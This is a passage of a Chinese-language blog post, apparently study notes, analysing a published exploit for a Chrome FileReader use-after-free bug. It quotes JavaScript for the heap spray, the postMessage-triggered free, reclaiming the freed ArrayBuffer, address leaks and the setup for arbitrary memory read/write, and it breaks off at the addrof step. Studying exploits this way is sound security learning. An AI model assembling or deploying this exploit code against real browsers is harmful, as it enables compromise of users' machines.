+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">string_size</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">128</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>;
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">contents</span> <span style="color:#f92672">=</span> String.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">repeat</span>.<span style="color:#a6e22e">call</span>(<span style="color:#e6db74">&#39;Z&#39;</span>, <span style="color:#a6e22e">string_size</span>);
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">File</span>([<span style="color:#a6e22e">contents</span>], <span style="color:#e6db74">&#34;text.txt&#34;</span>);
+</code></pre></div><p>漏洞和 FileReader相关，自然是要设置其参数。</p>
+<p><strong>但是为什么要这么大的一个字符串呢？文中没说</strong></p>
+<h3 id="3allocate_spray_holdersclear_spray">3.allocate_spray_holders()、clear_spray()</h3>
+<p>这里没有归入具体利用步骤中，但在 Chrome内存管理中有说明。即与我们 UAF漏洞相关的是 ArrayBuffer，但是ArrayBuffer存在一种隔离机制，影响了重用释放的内存，而分配不小于 2MB即可重用。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">outers</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>;
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">inners</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>;
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">allocate_spray_holders</span>() {
+    <span style="color:#a6e22e">spray</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(<span style="color:#a6e22e">outers</span>);
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">outers</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#a6e22e">spray</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(<span style="color:#a6e22e">inners</span>);
+    }
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">clear_spray</span>() {
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">outers</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {        
+        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">inners</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">++</span>) {
+            <span style="color:#a6e22e">spray</span>[<span style="color:#a6e22e">i</span>][<span style="color:#a6e22e">j</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+        }
+    }
+}
+</code></pre></div><p><strong>blog中给的 PartitionAlloc代码链接我应该自己去看看，尝试读懂其机制。</strong></p>
+<p><strong>这里的隔离机制怎么感觉有些幼稚呢？不是直接创建独立的堆，而是按申请的大小。是为了性能吗？希望以后能从垃圾回收的几个衡量因素的角度，全面的研究 Chrome的内存管理机制。</strong></p>
+<h3 id="4释放512mbreserved块">4.释放512MBreserved块</h3>
+<p>这里是我在 blog里没看明白的地方。令 512MB的 reserved块释放很简单，申请 1GB的超大 ArrayBuffer。</p>
+<p>但是之后的再次分配空间还是不够，OOM会导致渲染进程 crash，接着说配合手动触发 GC来避免 OOM，并且使 onprogress的 result连续释放，从而将 dangling指针指向于地址空间的下端。</p>
+<p><strong>如何避免 OOM没懂？</strong></p>
+<p>因为在我看来，“1GB分配失败-&gt;释放 reserved块 -&gt;再次分配 -&gt;失败，oom -&gt;crash”这一串操作对于用户层应该是具有“原子性”的，即一句 JS触发的。但是从 blog的描述和 exp代码来看，只能这样解释：“释放 reserved块” - “再次分配”之间存在间隙，可以执行手动 GC的代码。GC之后，加上 reserved块能够凑够 1GB。</p>
+<p>我疑惑的点就在于：<strong>是否存在这个间隙？GC后能否凑够1GB？</strong></p>
+<p>感觉1GB这个值应该很需要实验得出，它既要使得通常下 Chrome没有这个大空间分配，又要通常下触发 GC后便有这么大的空间了。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">    <span style="color:#66d9ef">try</span> {
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">failure</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>);
+    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span>);
+    }
+
+    <span style="color:#a6e22e">force_gc</span>();
+</code></pre></div><p>最后的 GC感觉应该是把之前那个 2MB空间，放置于直接映射区域。</p>
+<h3 id="5onprogress事件">5.onprogress事件</h3>
+<p>返回 exploit()，执行<code>reader.readAsArrayBuffer(f);</code>触发 onprogress事件。</p>
+<p>此事件在整个读取过程会多次触发，每次都会分配内存，需要使得最后 dangling指向的 ArrayBuffer位置可控。所谓的“可控”其实是根据32位平台下 Chrome的地址空间的规律，安排其大致位置。</p>
+<p>不过为了达到目的使用手动 GC，这就让人不解了。blog中也没说原理。因为触发 GC一般是先要用自己的内存申请占位、再释放，然后触发GC使得释放的内存可用，再让软件的分配落在自己专门留出来的空洞中。</p>
+<p>而这里只是为了让 onprogress触发后分配的内存：1.在reserved块中；2.最后的分配在地址空间的下端。</p>
+<p>我推想可能可以解释第1步为什么要一个大的字符串（128MB）。</p>
+<p>可能一：是用大的字符串使得每次触发后，ArrayBufferBuilder::ToArrayBuffer中按最大的单次分配，这样就比较大，reserved块之外中空间中没有这么大的空隙，于是就往 reserved块中分配了。</p>
+<p>可能二：是既然 reserved块之外的空间中有这么大的空隙，那么也可以将其填满，然后往 reserved块中分配。</p>
+<p>可能三：是 blog中提到触发后的连续分配、释放，在GC算法中存在这种情况，即将分配块压缩，然后再去末尾添加新的分配。如果有这样的逻辑，那么就可以使得触发后的分配连续了。毕竟有一大块空间，但并不意味着就要顺序分配啊。</p>
+<p>但这些都是 blog中未说的 Chrome内存管理细节。<strong>需要自己去证实。</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">    <span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">onprogress</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">evt</span>) {
+        <span style="color:#a6e22e">force_gc</span>();
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">evt</span>.<span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">result</span>;
+        <span style="color:#75715e">// console.log(`onprogress ${onprogress_cnt}`);
+</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">onprogress_cnt</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+        
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">byteLength</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">size</span>) {
+            <span style="color:#75715e">// console.log(`result has a different size than expected: ${res.byteLength}`);
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">return</span>;
+        }
+    
+        <span style="color:#a6e22e">lastlast</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">last</span>;   
+        <span style="color:#a6e22e">last</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">res</span>;
+    }
+</code></pre></div><p>从最后的 last、lastlast的创建方式可以看出，Chrome是引用传参。</p>
+<h3 id="6触发漏洞">6.触发漏洞</h3>
+<p>对应于 Step 3。</p>
+<p>因为漏洞是有成功率的，所以有一些代码是用于预先判断是否成功、统计次数的。</p>
+<p>（比如分配完后关联一个引用，通过此引用：res、last、lastlast获取长度信息，和开始的大字符串长度比较）</p>
+<p><strong>但是什么情况下有可能长度不同呢？</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">        <span style="color:#66d9ef">try</span> {
+            <span style="color:#75715e">// trigger the FREE
+</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">myWorker</span>.<span style="color:#a6e22e">postMessage</span>([<span style="color:#a6e22e">last</span>], [<span style="color:#a6e22e">last</span>, <span style="color:#a6e22e">lastlast</span>]);
+        } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
+            <span style="color:#75715e">// an exception with this message indicates that the FREE part of the exploit was successful
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;ArrayBuffer at index 1 could not be transferred&#39;</span>)) {
+			   ......	
+                <span style="color:#66d9ef">return</span>;
+            } <span style="color:#66d9ef">else</span> {
+                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span>);
+            }
+        }
+</code></pre></div><p>如开始时的漏洞分析，前面 last、lastlast的创建方式明显它们是对同一个 ArrayBuffer的引用。通过 postMessage来达到漏洞条件，其释放了 last，但漏洞导致 ArrayBuffer却还可以被 lastlast引用。</p>
+<p>其实从之后的异常信息可以知道，还是有相关的异常被检测到，但为什么不采取更激烈错误处理呢？不知道这种异常最后的处理例程是什么，反正不影响后续 JS执行。</p>
+<h3 id="7reclaim_mixed">7.reclaim_mixed()</h3>
+<p>先触发 GC，为了使 last指向的 ArrayBuffer释放后可重用。</p>
+<p>然后进入 reclaim_mixed()。</p>
+<p>这里的堆喷是为了重用释放的 ArrayBuffer，但是感觉堆喷得很少。这也是字符串要 128MB的原因吗？更好的“捕获”这里的堆喷。</p>
+<p><strong>或者是这里堆喷的大小符合内存管理机制？</strong></p>
+<p><strong>或者是 GC后立即分配的操作符合内存管理机制？</strong></p>
+<p>所以不需要堆喷太多。又是需要自己去研究的地方。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">marker1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x36313233</span>;
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">marker2</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x37414546</span>;
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reclaim_mixed</span>() {
+    <span style="color:#75715e">// spray the heap to reclaim the freed region
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">tmp</span> <span style="color:#f92672">=</span> {};
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">outers</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">inners</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">+=</span><span style="color:#ae81ff">3</span>) {
+            <span style="color:#a6e22e">spray</span>[<span style="color:#a6e22e">i</span>][<span style="color:#a6e22e">j</span>] <span style="color:#f92672">=</span> {<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">marker1</span>, <span style="color:#a6e22e">b</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">marker2</span>, <span style="color:#a6e22e">c</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">tmp</span>};
+            <span style="color:#a6e22e">spray</span>[<span style="color:#a6e22e">i</span>][<span style="color:#a6e22e">j</span>].<span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">spray</span>[<span style="color:#a6e22e">i</span>][<span style="color:#a6e22e">j</span>]     <span style="color:#75715e">// self-reference to find our absolute address
+</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">spray</span>[<span style="color:#a6e22e">i</span>][<span style="color:#a6e22e">j</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Array(<span style="color:#ae81ff">8</span>);
+            <span style="color:#a6e22e">spray</span>[<span style="color:#a6e22e">i</span>][<span style="color:#a6e22e">j</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint32Array</span>(<span style="color:#ae81ff">32</span>);
+        }
+    }
+}
+</code></pre></div><p>堆喷的子结构：</p>
+<pre><code>spray:
+	[i][j] &lt;--------------------
+		a:marker1(0x36313233)  |
+		b:marker2(0x37414546)  |
+		c:ref([i][j]) ----------
+	[i][j+1]
+    	ref(Array(8))
+    [i][j+2]
+    	ref(Uint32Array(32))
+</code></pre><h3 id="8重用释放的arraybuffer">8.重用释放的ArrayBuffer</h3>
+<p>通过 lastlast这个 dangling引用重用释放的 ArrayBuffer，通过 tarray其中的数据按 Uint32Array解析、操作。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">    <span style="color:#75715e">// access the reclaimed region as a Uint32Array
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">tarray</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint32Array</span>(<span style="color:#a6e22e">lastlast</span>);
+</code></pre></div><h3 id="9tarray中定位spray子结构find_pattern">9.tarray中定位spray子结构:find_pattern()</h3>
+<p><strong>对应不上前面说的“超过 2MB的 ArrayBuffer释放后被放置于直接映射区”</strong>。这里的堆喷用的就是之前这个 2MB的引用。</p>
+<p>但这2个引用应该只是同名关系啊，不太明白这个 2MB ArrayBuffer的释放重用体现在何处？</p>
+<p>从利用代码来看，明显是这里的堆喷使用的是漏洞释放的 ArrayBuffer内存。但感觉是释放后立即 GC导致的。</p>
+<p>之后的任意地址读写其实原理很清楚，说白了就是有一个 Array对象整体位于另一个 TypedArray的 contents区域内，所以Array对象的头部本来用户是操作不到的，现在就可以通过 TypedArray对 contents的正常操作实现。然后里面有指向 Array的 contents的指针，通过对它的修改再读写 Array[0]即可实现任意地址读写。</p>
+<p>唯一的差异只是在于相关数组对象的结构，有的还存在对象头、体分离的情况、以及内存中数值的存储形式。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">string_size</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">128</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>;
+...
+<span style="color:#a6e22e">object_prop_taidx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">find_pattern</span>();
+...
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">find_pattern</span>() {
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">start_offset</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00afc000</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">start_offset</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">string_size</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">50</span>){
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">tarray</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+        }
+        <span style="color:#75715e">// multiply by two because of the way SMIs are stored
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">tarray</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">==</span> <span style="color:#a6e22e">marker1</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>) {
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">tarray</span>[<span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#a6e22e">marker2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>) {
+                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`found possible candidate objectat idx </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">i</span>;
+            }
+        }
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+}
+</code></pre></div><p>不知道这里为什么可以跳过前面一部分，不过无伤大雅。</p>
+<p>在数值存储形式上是有个 * 2操作，有点奇葩。注释里的 SMI没查到什么意思。</p>
+<h3 id="10泄漏堆喷子结构地址">10.泄漏堆喷子结构地址</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"> 	<span style="color:#75715e">// leak the absolute address of the Object
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">obj_absolute_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tarray</span>[<span style="color:#a6e22e">object_prop_taidx</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;  
+    <span style="color:#75715e">// the third property of the sprayed Object is self-referential
+</span></code></pre></div><p>虽然没挂 windbg在内存中看，但是根据以前调试经验<code>spray[i][j].c=spray[i][j]</code>应该存的是一个引用，但是这种引用是不能通过 JS读出来的，解析方式不同。这里在 tarray中按 Uini32Array数据对待，才可以读出。</p>
+<h3 id="11泄露tarray地址">11.泄露tarray地址</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">ta_absolute_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj_absolute_addr</span> <span style="color:#f92672">-</span> (<span style="color:#a6e22e">object_prop_taidx</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
+</code></pre></div><p>10中泄露的是 spray子结构的绝对地址，而它是在 tarray中的。所以 绝对地址 - 某一偏移 = tarray地址。</p>
+<p>这个需要在调试器里看看 <strong>spray子结构、tarray的结构</strong></p>
+<h3 id="12spray中定位spray子结构get_obj_idx">12.spray中定位spray子结构:get_obj_idx()</h3>
+<p>通过 tarray修改用于定位的 marker1，再通过 spray来找这个标志值。</p>
+<p>其实是为了建立一个变量到这个定位到的 spray子结构的关联，以便之后直接使用此子结构。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">reader_obj</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_obj_idx</span>(<span style="color:#a6e22e">object_prop_taidx</span>);
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_obj_idx</span>(<span style="color:#a6e22e">prop_idx</span>) {
+    <span style="color:#75715e">// find the index of the Object in the spray array
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">tarray</span>[<span style="color:#a6e22e">prop_idx</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x62626262</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">outers</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">inners</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>) {
+            <span style="color:#66d9ef">try</span> {
+                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">spray</span>[<span style="color:#a6e22e">i</span>][<span style="color:#a6e22e">j</span>].<span style="color:#a6e22e">a</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x31313131</span>) {
+                    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`found object idx in the spray array: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">j</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">spray</span>[<span style="color:#a6e22e">i</span>][<span style="color:#a6e22e">j</span>];
+                }
+            } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
+        }   
+    }
+}
+</code></pre></div><h3 id="13获取任意地址读写所需信息get_corruptable_ui32a">13.获取任意地址读写所需信息:get_corruptable_ui32a()</h3>
+<p>前面 9中对任意地址读写的概述有点问题，不应该是操作 Array对象，而应该是 Uint32Array。这就和 10中说的引用在 spray中不能直接读出是一个道理，不同对象对数据的读写有不同的额外操作。而任意地址读写明显是不希望受这些这些额外操作影响，所以最后实现任意地址读写是通过对 spray数组子结构中的 <code>[i][j+2] = Uint32Array(32) </code> 对象头的修改完成的。</p>
+<h4 id="1addof">1.addof()</h4>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Wo0dsHole </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://Wo0dsHole.github.io/1993/b0/>https://Wo0dsHole.github.io/1993/b0/</span>
+            </p>
+            
+             
+            <p class="copyright-item lincese">
+                本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可
+            </p>
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-tag"></i>Tag(s): 
+            
+            <span class="tag"><a href="https://Wo0dsHole.github.io/tags/chrome%E6%BC%8F%E6%B4%9E/">
+                    #Chrome漏洞</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://Wo0dsHole.github.io/">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://Wo0dsHole.github.io/1/62-full-exploit-chain/" class="prev" rel="prev" title=""><i class="iconfont icon-left"></i>&nbsp;</a>
+         
+        
+        <a href="https://Wo0dsHole.github.io/1993/1993/" class="next" rel="next" title="1993-人生">1993-人生&nbsp;<i class="iconfont icon-right"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">1993 - 2020</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://Wo0dsHole.github.io/">Wo0dsHole</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+    <script src="/js/vendor_no_gallery.min.js" async=""></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
